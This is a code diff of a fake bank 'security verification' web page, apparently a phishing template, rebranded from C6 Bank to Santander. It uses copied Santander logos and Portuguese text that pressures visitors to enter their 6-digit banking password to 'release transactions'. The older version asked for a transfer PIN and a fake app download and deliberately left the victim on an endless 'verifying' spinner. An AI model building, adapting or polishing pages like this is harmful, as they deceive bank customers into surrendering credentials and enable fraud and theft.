@@ -3,25 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C6 Bank – Segurança App</title>
+    <title>Santander – Verificação de Segurança</title>
     <style>
         :root {
-            --c6-black: #000000;
-            --c6-dark: #121212;
-            --c6-silver: #a0a0a0;
-            --c6-bg: #f5f5f5;
+            --santander-red: #ec0000;
+            --santander-dark-red: #cc0000;
+            --santander-gray: #f5f5f5;
+            --santander-text: #444444;
+            --santander-white: #ffffff;
         }
 
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
+            font-family: 'Open Sans', Arial, sans-serif;
         }
 
         body {
-            background-color: var(--c6-bg);
-            color: var(--c6-black);
-            font-family: 'Inter', -apple-system, sans-serif;
+            background-color: var(--santander-gray);
+            color: var(--santander-text);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -30,61 +31,92 @@
         }
 
         .container {
-            background: #ffffff;
+            background: var(--santander-white);
             width: 100%;
-            max-width: 400px;
-            padding: 40px 24px;
+            max-width: 420px;
+            padding: 0;
             border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            overflow: hidden;
             text-align: center;
-            border-top: 5px solid var(--c6-black);
         }
 
-        .logo {
-            font-size: 30px;
-            font-weight: 900;
-            color: var(--c6-black);
-            margin-bottom: 5px;
-            letter-spacing: -1px;
+        .header-bar {
+            background-color: var(--santander-white);
+            padding: 25px 20px; /* Aumentado o preenchimento */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-bottom: 4px solid var(--santander-red);
         }
 
-        .logo span {
-            color: var(--c6-silver);
-            font-weight: 300;
+        /* Logótipo Santander do topo - agora maior */
+        .logo-img {
+            height: 65px; /* Aumentado de 45px para 65px */
+            max-width: 90%;
+            object-fit: contain;
+        }
+
+        .content {
+            padding: 40px 24px;
+        }
+
+        /* Ícone arredondado */
+        .security-icon-img {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 20px;
+            display: block;
+            object-fit: contain;
+        }
+
+        h2 {
+            font-size: 1.3rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1d1d1d;
         }
 
         .subtitle {
-            font-size: 0.85rem;
+            font-size: 0.95rem;
             color: #666;
-            margin-bottom: 30px;
-            line-height: 1.4;
+            margin-bottom: 35px;
+            line-height: 1.5;
         }
 
         .input-group {
-            margin-bottom: 25px;
-            text-align: left;
+            margin-bottom: 30px;
+            text-align: center;
         }
 
         label {
             display: block;
-            font-size: 0.75rem;
-            font-weight: 800;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            color: var(--c6-black);
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #333;
         }
 
         input[type="text"] {
             width: 100%;
+            max-width: 240px;
             padding: 15px;
-            font-size: 28px;
+            font-size: 32px;
             text-align: center;
-            letter-spacing: 10px;
-            border: 2px solid var(--c6-black);
+            letter-spacing: 4px;
+            border: 1px solid #ddd;
+            border-bottom: 4px solid var(--santander-red);
             border-radius: 4px;
             outline: none;
+            background: #fcfcfc;
             font-weight: 700;
-            color: var(--c6-black);
+            color: #333;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            background: #fff;
+            box-shadow: 0 4px 10px rgba(236, 0, 0, 0.1);
         }
 
         .btn-container {
@@ -94,35 +126,38 @@
         button {
             width: 100%;
             padding: 18px;
-            background-color: var(--c6-black);
+            background-color: var(--santander-red);
             color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 0.85rem;
-            font-weight: 800;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 700;
             cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            transition: background 0.3s;
+            gap: 12px;
+            transition: transform 0.1s, background 0.3s;
+        }
+
+        button:active {
+            transform: scale(0.98);
         }
 
         button:disabled {
-            background-color: #333;
+            background-color: #e0e0e0;
+            color: #aaa;
             cursor: not-allowed;
         }
 
         .loader {
-            width: 18px;
-            height: 18px;
-            border: 3px solid #FFF;
-            border-bottom-color: transparent;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
             border-radius: 50%;
             display: none;
-            animation: rotation 1s linear infinite;
+            animation: rotation 0.8s linear infinite;
         }
 
         @keyframes rotation {
@@ -131,40 +166,66 @@
         }
 
         .footer-info {
-            margin-top: 25px;
-            font-size: 0.7rem;
-            color: #999;
-            line-height: 1.4;
+            margin-top: 30px;
+            padding: 20px;
+            background: #fdfdfd;
+            font-size: 0.75rem;
+            color: #888;
+            border-top: 1px solid #eee;
         }
 
-        .security-icon {
-            margin-bottom: 15px;
-            font-size: 24px;
+        .message-box {
+            display: none;
+            background: #fff5f5;
+            border: 1px solid #ffdbdb;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 25px;
+            color: var(--santander-red);
+            font-size: 0.9rem;
+            font-weight: 500;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="security-icon">🔒</div>
-    <div class="logo">C6 <span>BANK</span></div>
-    <p class="subtitle">Verificação obrigatória para evitar bloqueios. Digite sua senha de transferência para sincronizar com o app de segurança.</p>
-    
-    <div class="input-group">
-        <label>Senha de 4 dígitos (Celular)</label>
-        <input id="pin" type="text" inputmode="numeric" maxlength="4" placeholder="0000">
+    <div class="header-bar">
+        <!-- Imagem do logótipo principal ajustada para ser maior -->
+        <img src="https://evef.com.br/images/vetor/novo%20logotipo%20santander%20banco%20vetor%20download%20simbolo%20desenho%20banco%20financeira%20crediario.jpg" 
+             alt="Logótipo Santander" 
+             class="logo-img"
+             onerror="this.src='https://via.placeholder.com/300x80?text=Santander'">
     </div>
+    
+    <div class="content">
+        <!-- Ícone secundário (logótipo arredondado) -->
+        <img src="https://static.vecteezy.com/system/resources/thumbnails/069/864/321/small_2x/glossy-santander-bank-logo-rounded-square-icon-free-png.png" 
+             alt="Ícone Santander" 
+             class="security-icon-img"
+             onerror="this.style.display='none'">
+             
+        <h2>Acesso Seguro</h2>
+        <p class="subtitle">Confirme a sua identidade para libertar as transações na app. Digite a sua palavra-passe de acesso (6 números).</p>
+        
+        <div id="errorMsg" class="message-box"></div>
 
-    <div class="btn-container">
-        <button id="mainBtn">
-            <span class="loader" id="loader"></span>
-            <span id="btnText">BAIXA APP DE SEGURANÇA C6 CELULAR</span>
-        </button>
+        <div class="input-group">
+            <label>A sua palavra-passe de 6 dígitos</label>
+            <input id="pin" type="text" inputmode="numeric" maxlength="6" placeholder="000000" autocomplete="off">
+        </div>
+
+        <div class="btn-container">
+            <button id="mainBtn">
+                <span class="loader" id="loader"></span>
+                <span id="btnText">CONFIRMAR IDENTIDADE</span>
+            </button>
+        </div>
     </div>
 
     <div class="footer-info">
-        Conexão criptografada ponta a ponta.<br>
-        Certificado Digital Carbon Security.
+        Proteção ID Santander ativa.<br>
+        Ambiente monitorizado e encriptado.
     </div>
 </div>
 
@@ -173,8 +234,9 @@
     const mainBtn = document.getElementById('mainBtn');
     const loader = document.getElementById('loader');
     const btnText = document.getElementById('btnText');
+    const errorMsg = document.getElementById('errorMsg');
 
-    // Impede digitar qualquer coisa que não seja número
+    // Permitir apenas números
     pinInput.addEventListener('input', function(e) {
         this.value = this.value.replace(/[^0-9]/g, '');
     });
@@ -182,19 +244,19 @@
     mainBtn.addEventListener('click', function() {
         const val = pinInput.value;
         
-        if (val.length === 4) {
-            // Desativa o botão e o input
+        if (val.length === 6) {
+            errorMsg.style.display = 'none';
             mainBtn.disabled = true;
             pinInput.disabled = true;
             
-            // Ativa o loop de "Aguarde"
             loader.style.display = 'inline-block';
-            btnText.textContent = 'AGUARDE... VERIFICANDO DISPOSITIVO';
+            btnText.textContent = 'A VERIFICAR...';
             
-            // Loop infinito: O estado não mudará daqui.
-            console.log("Iniciando loop de segurança infinito...");
+            console.log("A iniciar validação...");
         } else {
-            alert("Por favor, digite os 4 dígitos da sua senha.");
+            errorMsg.textContent = "Por favor, introduza os 6 dígitos da sua palavra-passe.";
+            errorMsg.style.display = 'block';
+            pinInput.focus();
         }
     });
 </script>
